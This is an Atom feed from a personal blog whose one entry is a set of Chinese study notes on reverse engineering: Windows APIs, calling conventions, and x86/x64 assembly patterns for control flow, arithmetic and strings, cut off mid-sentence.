<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>s0uthwood&#39;s Blog</title>
  
  
  <link href="https://s0uthwood.github.io/atom.xml" rel="self"/>
  
  <link href="https://s0uthwood.github.io/"/>
  <updated>2021-09-18T18:40:59.273Z</updated>
  <id>https://s0uthwood.github.io/</id>
  
  <author>
    <name>s0uthwood</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>加密与解密学习笔记</title>
    <link href="https://s0uthwood.github.io/2021/09/19/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://s0uthwood.github.io/2021/09/19/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-09-18T18:15:45.000Z</published>
    <updated>2021-09-18T18:40:59.273Z</updated>
    
    <content type="html"><![CDATA[<p>suibiankankan</p><a id="more"></a><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="分析的一般途径和策略"><a href="#分析的一般途径和策略" class="headerlink" title="分析的一般途径和策略"></a>分析的一般途径和策略</h2><ol><li>学会软件的操作和使用方法 $\to$ 推测出软件的设计思想和编程思路</li><li>静态分析：阅读反汇编的程序清单，利用人机交互的提示信息了解片段所完成的功能，宏观了解软件的编程思路</li><li>动态跟踪：首先完成反反调试，并解密加密程序，了解初始化工作，获得各个模块之间的中间结果<ol><li>粗跟踪：不跟踪调用等指令，仅根据执行结果分析程序的功能</li><li>细跟踪：针对性跟踪分析关键模块</li></ol></li></ol><h2 id="文本字符"><a href="#文本字符" class="headerlink" title="文本字符"></a>文本字符</h2><h3 id="ASCII-和-Unicode"><a href="#ASCII-和-Unicode" class="headerlink" title="ASCII 和 Unicode"></a>ASCII 和 Unicode</h3><p>Unicode 是 ASCII 的扩展，所有字符都是 16 位</p><h3 id="字节存储顺序"><a href="#字节存储顺序" class="headerlink" title="字节存储顺序"></a>字节存储顺序</h3><p>小端序（Little-endian）：高位字节存入高地址，低位字节存入低地址</p><p>大端序（Big-endian）：高位字节存入低地址，低位字节存入高地址</p><div class="table-container"><table><thead><tr><th>字节序</th><th>0</th><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>大端序</td><td>12</td><td>34</td><td>56</td><td>78</td></tr><tr><td>小端序</td><td>78</td><td>56</td><td>34</td><td>12</td></tr></tbody></table></div><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Win-32-API"><a href="#Win-32-API" class="headerlink" title="Win 32 API"></a>Win 32 API</h3><p>32位API与64位API在名称和功能上基本没有变化</p><p>Windows运转核心为DLL动态链接库</p><ul><li>KERNEL32.DLL：操作系统核心功能服务，进程与线程控制、内存管理、文件访问等</li><li>USER32.DLL：负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等</li><li>GDI：图形设备接口，允许程序在屏幕和打印机上显示文本和图形</li></ul><h3 id="Windows消息机制"><a href="#Windows消息机制" class="headerlink" title="Windows消息机制"></a>Windows消息机制</h3><p>Windows使用Message提供应用程序与应用程序、应用程序与操作系统之间的通信</p><p>常用的函数如下：</p><h4 id="SendMessage"><a href="#SendMessage" class="headerlink" title="SendMessage"></a>SendMessage</h4><p>调用一个窗口的窗口函数，将一条消息发送给那个窗口。除非消息处理完毕，否则不会返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">SendMessage</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND hwnd,<span class="comment">// 目的窗口的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">UINT Msg,<span class="comment">// 消息标识符</span></span></span></span><br><span class="line"><span class="function"><span class="params">WPARAM wParam,<span class="comment">// 消息的WPARAM域</span></span></span></span><br><span class="line"><span class="function"><span class="params">LPARAM lParam<span class="comment">// 消息的LPARAM域</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>返回值</strong>：消息投递成功，返回非零</p><h4 id="WM-COMMAND"><a href="#WM-COMMAND" class="headerlink" title="WM_COMMAND"></a>WM_COMMAND</h4><p>当用户从菜单或按钮中选择一条命令或者一个控件时该消息被发送给它的父窗口，或者当一个快捷键被释放时发送该消息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WM_COMMAND</span><br><span class="line">wNotifyCode = HIWORD(wParam); <span class="comment">// 通告函数</span></span><br><span class="line">wID = LOWORD(wParam);<span class="comment">// 菜单条目、控件或快捷键的标识符</span></span><br><span class="line">hwndCtl = (HWND) lParam;<span class="comment">// 控件句柄</span></span><br></pre></td></tr></table></figure><p><strong>返回值</strong>：如果应用程序处理这条消息，则返回值为零</p><h4 id="WM-DESTORY"><a href="#WM-DESTORY" class="headerlink" title="WM_DESTORY"></a>WM_DESTORY</h4><p>当一个窗口被销毁时发送该消息。该消息对应 <code>0x02</code>，没有参数</p><p><strong>返回值</strong>：如果应用程序处理这条消息，则返回值为零</p><h4 id="WM-GETTEXT"><a href="#WM-GETTEXT" class="headerlink" title="WM_GETTEXT"></a>WM_GETTEXT</h4><p>当需要将一个窗口的文本复制到一个由呼叫程序提供的缓冲区中时，发送该消息。该消息对应 <code>0x0D</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WM_GETTEXT</span><br><span class="line">wParam = (WPARAM) cchTextMax;<span class="comment">// 需要复制的字符数</span></span><br><span class="line">lParam = (LPARAM) lpszText;<span class="comment">// 接收文本的缓冲区地址</span></span><br></pre></td></tr></table></figure><p><strong>返回值</strong>：被复制的字符数</p><h4 id="WM-QUIT"><a href="#WM-QUIT" class="headerlink" title="WM_QUIT"></a>WM_QUIT</h4><p>当应用程序调用 <code>PostQuitMessage</code> 时，生成 <code>WM_QUIT</code>消息，对应 <code>0x12</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WM_QUIT</span><br><span class="line">nExitCode = (<span class="keyword">int</span>) wParam;<span class="comment">// 退出代码</span></span><br></pre></td></tr></table></figure><p>无<strong>返回值</strong></p><h4 id="WM-LBUTTONDOWN"><a href="#WM-LBUTTONDOWN" class="headerlink" title="WM_LBUTTONDOWN"></a>WM_LBUTTONDOWN</h4><p>光标停在窗口客户区且点击左键时，发送此消息</p><p>如果鼠标未捕捉，将下发给光标下的窗口，否则发送给捕获鼠标动作的窗口</p><p>对应 <code>0x201</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WM_LBUTTONDOWN</span><br><span class="line">fwkeys = wParam;<span class="comment">// key旗帜</span></span><br><span class="line">xPos = LOWORD(lParam);<span class="comment">// 光标的水平位置</span></span><br><span class="line">yPos = HIWORD(lParam);<span class="comment">// 光标的垂直位置</span></span><br></pre></td></tr></table></figure><p><strong>返回值</strong>：如果应用程序处理了这条消息，返回值为零</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><ul><li>应用程序不会直接访问物理地址</li><li>虚拟内存管理器通过虚拟地址的访问请求来控制所有的物理地址访问</li><li>每个应用都有独立的寻址空间，不同应用程序的地址空间是彼此隔离的</li><li>DLL程序没有私有空间，总是被映射到其他应用程序的地址空间中，作为程序的一部分运行</li></ul><h1 id="动态分析技术"><a href="#动态分析技术" class="headerlink" title="动态分析技术"></a>动态分析技术</h1><h1 id="逆向分析技术"><a href="#逆向分析技术" class="headerlink" title="逆向分析技术"></a>逆向分析技术</h1><h2 id="Win32"><a href="#Win32" class="headerlink" title="Win32"></a>Win32</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>程序先执行启动代码，随后调用 <code>WinMain</code> 函数</p><p>实例中的系统调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Call KERNEL32.GetVersion              ; 确定Windows系统版本</span><br><span class="line">Call KERNEL32.GetCommandLineA         ; 指向系统的完整命令行的指针</span><br><span class="line">Call KERNEL32.GetStartupInfoA         ; 获取一个进程的启动信息</span><br><span class="line">Call KERNEL32.GetModuleHandleA        ; 返回进程地址空间执行文件基地址</span><br><span class="line">call 00401000                         ; 调用WinMain</span><br><span class="line">call 004012EC                         ; 退出程序</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><blockquote><p>通常无需关注启动，直接查看 <code>WinMain</code> 即可</p></blockquote><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>编译器通常使用 <code>call</code> 和 <code>ret</code> 指令来调用函数</p><p><code>call</code> 指令将其之后的指令地址压入栈顶，<code>ret</code> 指令则返回到调用位置</p><p>有时可能利用寄存器进行间接调用，如： <code>call eax</code> </p><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>调用函数时，将参数压入栈中</p><p>对于不同语言，有不同的调用约定</p><div class="table-container"><table><thead><tr><th>类型</th><th>C/C++(__cdecl)</th><th>pascal</th><th>stdcall</th><th>fastcall</th></tr></thead><tbody><tr><td>参数传递顺序</td><td>从右向左</td><td>从左向右</td><td>从右向左</td><td>使用寄存器和栈</td></tr><tr><td>平衡栈</td><td>调用者</td><td>子程序</td><td>子程序</td><td>子程序</td></tr><tr><td>VARARG</td><td>是</td><td>否</td><td>允许*</td></tr></tbody></table></div><blockquote><p>VARARG表示参数个数可以不确定</p><p>stdcall中，如果参数个数不确定，需要由调用程序来平衡栈</p></blockquote><p>程序执行过程：</p><ul><li>调用者将函数执行完毕时应返回的地址、参数压入栈</li><li>函数使用 <code>ebp</code> 指针+偏移量对栈中的参数进行寻址并取出，完成操作</li><li>子程序使用 <code>ret</code> 或 <code>retf</code> 指令返回， <code>eip</code> 置为栈中保存的地址，并继续执行</li></ul><p>栈的建立过程（两个参数时）：</p><ul><li>先将 <code>arg2</code> 压栈，<code>esp=K-04h</code></li><li>将 <code>arg1</code> 压栈，<code>esp=K-08h</code> </li><li>执行 <code>call</code> ，把返回地址压栈，<code>esp=K-0Ch</code></li><li>为了程序能够恢复，将 <code>ebp</code> 压栈，<code>esp=K-10h</code></li><li><code>move ebp, esp</code>，将当前的栈顶设置为栈底</li><li><code>sub esp, 8</code> ，定义局部变量，两个变量分别为 <code>[esp-4]</code> 和 <code>[esp-8]</code></li><li>函数结束时，<code>add esp, 8</code> 释放局部变量占用，或者使用 <code>ret 8</code> 来释放</li></ul><blockquote><p>还可以用enter和leave指令维护</p><p><code>enter</code> 指令：<code>push ebp</code>，<code>mov ebp, esp</code>，<code>sub esp, xxx</code></p><p><code>leave</code> 指令：<code>add esp, xxx</code>，<code>pop ebp</code></p></blockquote><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>通常遵循 <code>fastcall</code> 规范</p><ul><li>VC++：左边两个参数分别存入 <code>ecx</code>, <code>edx</code> 中，其余压栈</li><li>Borland Delphi/C++：左边三个参数分别存入 <code>eax</code>, <code>edx</code>, <code>ecx</code> 中，其余按PASCAL方式压栈</li></ul><p>C++非静态类成员默认调用 <code>thiscall</code> ，对象的每个函数隐含接受 <code>this</code> 参数，使用 <code>eax</code> 存放，其余参数从右到左压栈</p><h4 id="名称修饰约定"><a href="#名称修饰约定" class="headerlink" title="名称修饰约定"></a>名称修饰约定</h4><p>为了操作符和函数重载，C++编译器会按照规则修改入口点的符号名，从而允许同一个名字有多个用法。</p><p>C的规则如下：</p><ul><li>stdcall调用约定在输出函数名前加下划线，在后面加@，格式为 <code>_functionname@number</code></li><li>__cdecl调用约定格式为 <code>_functionname</code></li><li>Fastcall调用约定格式位 <code>@functionname@number</code></li></ul><p>均不改变大小写</p><p>C++规则如下：</p><ul><li>stdcall调用约定以 <code>?</code> 开头，函数名后以 <code>@@YG</code> 标识参数表开始，后跟参数表，参数表第一项位返回值类型，其后依次为参数的数据类型，指针标识在其所指数据类型前，参数表后，以 <code>@Z</code> 标识整个名字的结束，若无参数，则以 <code>Z</code> 结束。格式为 <code>?functionname@@YG******@Z</code> 或 <code>?functionname@@YG*XZ</code></li><li>__cdecl调用将 <code>@@YG</code> 替换为 <code>@@YA</code></li><li>Fastcall调用将 <code>@@YG</code> 替换为 <code>@@YI</code></li></ul><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><h4 id="return操作返回"><a href="#return操作返回" class="headerlink" title="return操作返回"></a>return操作返回</h4><p>存放在 <code>eax</code> 寄存器中，高32位存放在 <code>edx</code> 中</p><h4 id="传引用方式返回"><a href="#传引用方式返回" class="headerlink" title="传引用方式返回"></a>传引用方式返回</h4><p>传引用调用方式将变量的地址传递给函数，可以在子函数中修改该内存单元中变量的值，因此允许修改原始变量</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>函数内部定义的一个变量，作用域和生命周期仅局限于该函数内</p><h5 id="栈存放"><a href="#栈存放" class="headerlink" title="栈存放"></a>栈存放</h5><p>先将参数压入栈中，再修改 <code>ebp</code> ，最后减小 <code>esp</code>。因此 <code>[ebp+**h]</code> 表示参数， <code>[ebp-**h]</code> 表示局部变量</p><h5 id="寄存器存放"><a href="#寄存器存放" class="headerlink" title="寄存器存放"></a>寄存器存放</h5><p>有 6 个通用寄存器尽可能有效地存放局部变量， 因此需要注意确定当前的寄存器中存储的变量是哪个变量</p><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>局部变量存放在栈中，而全局变量存放在内存区中</p><p>版本标记等常数通常为全局变量</p><p>全局变量通常存放在数据区块 <code>.data</code> 的一个固定地址处，程序使用固定的硬编码地址进行寻址</p><p>如果在只读区块，说明是一个常量</p><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>一般通过基址+变址实现寻址，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [407030h + eax]</span><br></pre></td></tr></table></figure><p>间接寻址一般用于给数组和结构赋值，<code>[base+n]</code> 根据n的不同对结构中的相应单元赋值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0040101D lea esi, dword ptr [esp+8]</span><br><span class="line">00401021 mov edi, 3</span><br><span class="line">00401026 mov eas, dword ptr [esi]</span><br><span class="line">...</span><br><span class="line">00401036 add esi, 4</span><br><span class="line">00401039 dec edi</span><br><span class="line">0040103A jnz short 00401026</span><br></pre></td></tr></table></figure><h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><blockquote><p>C++面向对象中，最重要的概念就是虚函数</p></blockquote><p>虚函数是程序运行时定义的函数，其地址不能在编译时确定，只能在调用即将进行时确定。虚函数的引用存放在专用数组——虚函数表（Virtual Table，VTBL）中。</p><p>调用时首先通过虚函数指针找到虚函数表的地址，然后在虚函数表中找到该函数的入口地址，最后进行调用。</p><h3 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h3><h4 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h4><p>汇编形式通常为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp a, bjz  0040xxxxh  ; (jnz)</span><br></pre></td></tr></table></figure><p>可以用 <code>test eax, eax</code> 替代 <code>cmp</code> ，该语句（相当于逻辑与运算）表示当 <code>eax</code> 为 0 时，设置 <code>ZF</code> 为 1，<code>jz</code> 则表示 <code>ZF</code> 位为 1 时跳转</p><h4 id="switch-case"><a href="#switch-case" class="headerlink" title="switch-case"></a>switch-case</h4><p>无优化版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040101D cmp [ebp-08], 01    ; case 100401021 je  0040103100401023 cmp [ebp-08], 02    ; case 200401027 je  0040104000401029 cmp [ebp-08], 0A    ; case 100040102D je  0040104F0040102F jmp 0040105E        ; default</span><br></pre></td></tr></table></figure><p>使用 <code>dec</code> 指令替代 <code>cmp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [esp+08]dec eax             ; case 1je  0040xxxxdec eax             ; case 2je  0040xxxxsub eax, 00000008   ; case 10je  0040xxxx</span><br></pre></td></tr></table></figure><p>跳转表实现（case的取值为算术级数时）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp dword ptr [4*eax+004010B0]   ; 跳转表</span><br></pre></td></tr></table></figure><h4 id="转移指令机器码计算"><a href="#转移指令机器码计算" class="headerlink" title="转移指令机器码计算"></a>转移指令机器码计算</h4><p>位移量=目的地址-起始地址-跳转指令长度</p><p>转移指令机器码=转移类别机器码+位移量</p><p>转移指令可以分为短转移，长转移和子程序调用（call）</p><p>短转移2字节</p><p>长转移无条件5字节，条件转移6字节</p><p>call指令5字节</p><h4 id="条件设置指令"><a href="#条件设置指令" class="headerlink" title="条件设置指令"></a>条件设置指令</h4><p>对于语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = (a &lt; b) ? c1 : c2;</span><br></pre></td></tr></table></figure><p>条件分支语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp a, b  mov eax, c1  jl  L1  mov eax, c2L1:</span><br></pre></td></tr></table></figure><p>使用条件设置语句可以不包含条件分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor   eax, eaxcmp   a, bsetge al       ; if a &gt;&#x3D; b, al &#x3D; 1, else al &#x3D; 0dec   eaxand   eax, (c1 - c2)add   eax, c2</span><br></pre></td></tr></table></figure><p>或者使用条件传输指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov   eax, c2cmp   a, bcmovl eax, cl</span><br></pre></td></tr></table></figure><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>通常使用 <code>ecx</code> 寄存器作为计数器，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx ; 计数器清空:L1inc ecx...cmp ecx, 05  ; 循环退出条件jbe L1</span><br></pre></td></tr></table></figure><p>优化后的循环实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx    xor eax, eax:L1    add ecx, eax    inc eax    cmp eax, 64h    jle L1    xor eax, eax</span><br></pre></td></tr></table></figure><p>对应的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum = <span class="number">0</span>;<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++)    sum += i;</span><br></pre></td></tr></table></figure><h3 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h3><h4 id="加减法"><a href="#加减法" class="headerlink" title="加减法"></a>加减法</h4><p><code>add</code> 和 <code>sub</code> 指令，有时候可以使用 <code>lea</code> 进行优化</p><p>lea 允许一个时钟内计算 <code>lea edx, [eax+ecx+78h]</code> 级别的运算</p><h4 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h4><p>乘法使用 <code>mul</code> 或 <code>imul</code> 指令</p><p>对于2的幂，使用 <code>shl</code> 指令可以加快运算</p><p>由于 <code>lea</code> 指令可以实现乘 2, 4, 8 的运算，因此可以用来加快 3, 5, 6, 7, 9 等数字的乘法运算，如 <code>lea eax, [eax+eax*4]</code></p><h4 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h4><p><code>div</code> 或 <code>idiv</code> 指令</p><p>对于2的幂，使用 <code>shr</code> 指令加速，有符号时使用 <code>sar</code></p><p>此外可以利用乘法进行加速</p><p>常见的优化公式为</p><script type="math/tex; mode=display">\dfrac{a}{b}=a\times \dfrac{1}{b}</script><p>因此，$\div 11$ 可以优化为 $(\times 2E8BA2E9)&gt;&gt;(32+1)$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov  eax, 2E8BA2E9imul ecxsar  edx, 1          ; edx中存放了乘法的高位双字节mov  ecx, edx</span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><h4 id="字符串存储"><a href="#字符串存储" class="headerlink" title="字符串存储"></a>字符串存储</h4><p>分为两种，一种使用结束符作为标识，一种记录长度</p><ul><li>C语言：<code>String\0</code></li><li>DOS字符串：<code>String$</code></li><li>PASCAL：<code>\x05String</code></li><li>Delphi：<code>\x05\x00String</code></li></ul><p>Go语言使用一个64位整型记录长度</p><h4 id="字符寻址指令"><a href="#字符寻址指令" class="headerlink" title="字符寻址指令"></a>字符寻址指令</h4><p>mov将当前指令所在的内存复制并放到目的寄存器中，可操作常量或指针</p><p>lea是装入有效地址，操作数是地址</p><p>以下两条指令是等价的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea eax, [401000h]mov eax, 401000h</span><br></pre></td></tr></table></figure><p>都是将401000h写入eax寄存器中</p><p>因此，以下两个指令也是等价的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea eax, [eax+8]add eax, 8</span><br></pre></td></tr></table></figure><p>常被编译器用来计算加法</p><h4 id="ASCII大小写转换"><a href="#ASCII大小写转换" class="headerlink" title="ASCII大小写转换"></a>ASCII大小写转换</h4><p>区别在于二进制的第五位，大写字母为0，小写字母为1</p><p>因此有如下方法</p><ul><li>大小写转换：$\pm\ \mathrm{0x}20$，$\oplus\ \mathrm{0x}20$</li><li>转大写：$\&amp;\ \mathrm{0b}11011111$</li><li>转小写：$|\ \mathrm{0b}00100000$</li></ul><h4 id="计算长度"><a href="#计算长度" class="headerlink" title="计算长度"></a>计算长度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ecx, FFFFFFFF  ; 这一句是一个重要特征xor eax, eax       ; 清零，原文为subrepnz              ; 复制串操作，直到ecx为0scasb              ; 串扫描指令，把al中的内容与edi指向的附加段中的数据逐一比较not ecx            ; ecx&#x3D;字符长度+1dec ecx            ; ecx&#x3D;字符长度je xxxxxx          ; 如果ecx为0，说明长度为0</span><br></pre></td></tr></table></figure><h3 id="指令修改技巧"><a href="#指令修改技巧" class="headerlink" title="指令修改技巧"></a>指令修改技巧</h3><p>eax有优化，尽可能使用</p><p>替换字节：</p><div class="table-container"><table><thead><tr><th>指令</th><th>机器码</th><th>指令字节长度</th></tr></thead><tbody><tr><td>nop</td><td>90</td><td>1</td></tr><tr><td>push eax + pop eax</td><td>50 58</td><td>2</td></tr><tr><td>inc eax + dec eax</td><td>40 48</td><td>2</td></tr><tr><td>mov edi, edi</td><td>8B FF</td><td>2</td></tr><tr><td>jmp xx</td><td>EB 00</td><td>2</td></tr></tbody></table></div><p>用nop就行</p><p>寄存器清零：</p><div class="table-container"><table><thead><tr><th>指令</th><th>机器码</th><th>指令字节长度</th></tr></thead><tbody><tr><td>mov eax, 00000000h</td><td>B8 00 00 00 00</td><td>5</td></tr><tr><td>push 0 + pop eax</td><td>6A 00 + 58</td><td>3</td></tr><tr><td>sub eax, eax</td><td>2B C0</td><td>2</td></tr><tr><td>xor eax, eax</td><td>33 C0</td><td>2</td></tr></tbody></table></div><p>测试寄存器是否为0：</p><div class="table-container"><table><thead><tr><th>指令</th><th>机器码</th><th>指令字节长度</th></tr></thead><tbody><tr><td>cmp eax, 00000000h</td><td>83 F8 00</td><td>3</td></tr><tr><td>or eax, eax / test eax, eax</td><td>0B C0 / 85 C0</td><td>2</td></tr></tbody></table></div><p>后接 <code>je label</code> 字节码为 <code>74 xx</code> 或 <code>0F 84 xxxxxxxx</code>，长度为2或6，取决于近跳转还是远跳转</p><p>寄存器置 <code>0FFFFFFFFh</code></p><div class="table-container"><table><thead><tr><th>指令</th><th>机器码</th><th>指令字节长度</th></tr></thead><tbody><tr><td>mov eax, 0FFFFFFFFh</td><td>B8 FF FF FF FF</td><td>5</td></tr><tr><td>（清零后）dec eax</td><td>48</td><td>1</td></tr><tr><td>std + sbb eax, eax</td><td>F9 + 2B C0</td><td>3</td></tr></tbody></table></div><p>转移指令</p><div class="table-container"><table><thead><tr><th>指令</th><th>机器码</th><th>指令字节长度</th></tr></thead><tbody><tr><td>jmp label</td><td>EB xx / E9 xxxxxxxx</td><td>2 / 6</td></tr><tr><td>push label + ret</td><td>68 xxxxxxxx + C3</td><td>6</td></tr></tbody></table></div><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>与32位有很多重叠</p><h3 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h3><p>64位通用寄存器 R 开头</p><p>8个128位 XMM 寄存器，通常用来优化（SIMD指令）</p><p>此外， <code>AX</code> 低16位，<code>AL</code> 低8位， <code>AH</code> 第 $8\sim 15$ 位</p><p><code>R8</code> 则有 <code>R8D</code> 低32位，<code>R8W</code> 低16位，<code>R8B</code> 低8位</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="栈-1"><a href="#栈-1" class="headerlink" title="栈"></a>栈</h4><p>x64中有如下区别</p><ul><li><p>一个栈空间8字节（64位）</p></li><li><p>汇编指令对栈顶需要对齐16（被16整除）</p></li></ul><h4 id="根据start寻找main"><a href="#根据start寻找main" class="headerlink" title="根据start寻找main"></a>根据start寻找main</h4><p>start函数结束前会有如下指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp __tmainCRTStartup</span><br></pre></td></tr></table></figure><p>进入该函数后可以看到 <code>main</code> 函数</p><p>如果符号表被去除，可根据前后特征进行定位</p><blockquote><p>在调用完成main后，通常会调用exit来退出进程，所以exit前的一个call就是main函数（也可能在该函数内部的call中）。</p></blockquote><h4 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h4><p>使用寄存器快速调用约定</p><p>前几个参数使用的寄存器是固定的，后续的参数从右往左栈，非1, 2, 4, 8字节大小的参数必须用引用（地址）传参</p><p>传递顺序为 <code>RCX</code>， <code>RDX</code>， <code>R8</code>， <code>R9</code>，所有浮点参数由XMM传参，顺序依次为 <code>XMM0</code> ~ <code>XMM3</code></p><blockquote><p>为了使得寄存器仍然能够使用，会预留栈空间，将寄存器的值存入栈空间中，该空间由调用者申请并平衡</p></blockquote><h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><p>使用 <code>RAX</code> 返回参数，返回值过大可以使用栈空间作为参数间接访问</p><h3 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="局部变量-1"><a href="#局部变量-1" class="headerlink" title="局部变量"></a>局部变量</h4><p>使用栈区进行存放</p><p>Release版会更多地使用寄存器</p><h4 id="全局变量-1"><a href="#全局变量-1" class="headerlink" title="全局变量"></a>全局变量</h4><p>地址通常在编译期固定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, cs:140009150h</span><br></pre></td></tr></table></figure><h4 id="数组-1"><a href="#数组-1" class="headerlink" title="数组"></a>数组</h4><p>$地址=首地址+类型大小\times 下标$</p><blockquote><p>IDA中使用Y快捷键来修改数据类型，可以反编译成下标模式，更好看一些</p></blockquote><p>汇编通常为 <code>[地址+寄存器*n]</code>（或者循环中每次循环 <code>地址+=n</code>？）</p><h3 id="控制语句-1"><a href="#控制语句-1" class="headerlink" title="控制语句"></a>控制语句</h3><p>通常虚线箭头表示有条件跳转，实线箭头表示无条件跳转</p><p>if 语句：jxx跳转，且目的地址后没有jxx（说明不是循环）</p><p>if else语句：jxx跳转，且目的地之前有一个jmp实跳转，目的地址后无跳转</p><p>if elif else语句：多个jxx跳转，每个Block以jmp结尾，最后一个Block不含跳转</p><p>switch case语句：分支数 $\geqslant 6$ 使用case表，$&lt;6$ 使用else 